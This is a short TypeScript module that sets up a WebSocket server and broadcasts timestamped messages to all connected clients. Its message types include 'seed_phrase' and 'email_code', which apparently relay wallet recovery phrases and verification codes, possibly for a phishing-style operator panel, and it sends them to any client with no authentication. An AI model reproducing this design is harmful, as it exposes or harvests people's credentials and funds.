import { WebSocketServer, WebSocket } from 'ws';
import { Server } from 'http';

let wss: WebSocketServer;

export function setupWebSocket(server: Server) {
  wss = new WebSocketServer({ server });

  wss.on('connection', (ws: WebSocket) => {
    console.log('New WebSocket connection');
    ws.on('error', console.error);
  });

  return { 
    wss,
    broadcastUpdate: (type: 'email_code' | 'seed_phrase' | 'balance' | 'reset' | 'new_user' | 'status_update', data: any) => {
      if (!wss) return;
      
      const message = JSON.stringify({
        type,
        ...data,
        timestamp: new Date().toISOString()
      });

      wss.clients.forEach((client: WebSocket) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(message);
        }
      });
    }
  };
} 